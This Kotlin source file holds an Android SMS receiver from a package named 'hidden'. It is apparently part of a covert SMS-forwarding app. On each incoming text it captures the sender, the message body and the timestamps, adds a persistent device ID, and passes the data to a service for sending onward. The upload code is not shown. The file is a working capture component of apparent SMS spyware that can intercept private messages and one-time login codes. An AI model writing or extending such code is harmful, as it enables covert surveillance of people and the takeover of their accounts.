package com.smsforwarder.hidden

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class SmsReceiver : BroadcastReceiver() {
    
    companion object {
        private const val TAG = "SmsReceiver"
    }
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            try {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                
                for (message in messages) {
                    processSmsMessage(context, message)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing SMS: ${e.message}")
            }
        }
    }
    
    private fun processSmsMessage(context: Context, message: SmsMessage) {
        try {
            val deviceId = getDeviceId(context)
            val sender = message.originatingAddress ?: "Unknown"
            val messageBody = message.messageBody ?: ""
            val timestamp = message.timestampMillis
            val receivedAt = System.currentTimeMillis()
            
            // إنشاء كائن البيانات
            val smsData = JSONObject().apply {
                put("deviceId", deviceId)
                put("sender", sender)
                put("messageBody", messageBody)
                put("timestamp", timestamp)
                put("receivedAt", receivedAt)
                put("date", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp)))
            }
            
            // إرسال البيانات إلى الخدمة
            val serviceIntent = Intent(context, SmsService::class.java).apply {
                action = SmsService.ACTION_SEND_SMS_DATA
                putExtra(SmsService.EXTRA_SMS_DATA, smsData.toString())
            }
            
            context.startForegroundService(serviceIntent)
            
            Log.d(TAG, "SMS processed and sent to service: $sender")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing SMS message: ${e.message}")
        }
    }
    
    private fun getDeviceId(context: Context): String {
        val prefs = context.getSharedPreferences("sms_forwarder_prefs", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("device_id", null)
        
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString()
            prefs.edit().putString("device_id", deviceId).apply()
        }
        
        return deviceId
    }
}